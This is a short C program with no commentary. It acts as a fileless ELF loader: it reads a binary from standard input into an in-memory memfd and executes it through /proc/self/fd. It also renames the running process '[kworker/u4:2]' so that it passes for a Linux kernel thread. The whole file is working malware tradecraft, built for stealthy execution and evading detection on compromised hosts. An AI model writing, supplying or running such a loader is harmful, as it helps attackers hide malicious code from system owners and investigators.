#define _GNU_SOURCE
#include <linux/memfd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

static int memfd_create_raw(const char *name, unsigned flags)
{
    return (int)syscall(__NR_memfd_create, name, flags);
}

int main(int argc, char *argv[])
{

    int mfd = memfd_create_raw("", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return 1; }

    uint8_t buf[65536];
    ssize_t n, total = 0;
    while ((n = read(STDIN_FILENO, buf, sizeof(buf))) > 0) {
        ssize_t w, off = 0;
        while (off < n) {
            w = write(mfd, buf + off, (size_t)(n - off));
            if (w < 0) { perror("write memfd"); return 1; }
            off += w;
        }
        total += n;
    }

    if (total < 4) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    uint8_t magic[4];
    if (pread(mfd, magic, 4, 0) == 4) {
        if (magic[0] != 0x7f || magic[1] != 'E') {
            fprintf(stderr, "[-] not an ELF (magic: %02x%02x%02x%02x)\n",
                    magic[0], magic[1], magic[2], magic[3]);
            return 1;
        }
    }

    fprintf(stderr, "[*] %zd bytes in memfd fd=%d - exec\n", total, mfd);

    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", mfd);

    int new_argc = argc;
    char **new_argv = malloc((size_t)(new_argc + 1) * sizeof(char *));

    new_argv[0] = (char *)"[kworker/u4:2]";
    for (int i = 1; i < argc; i++) new_argv[i] = argv[i];
    new_argv[new_argc] = NULL;

    execve(path, new_argv, environ);
    perror("execve");
    return 1;
}
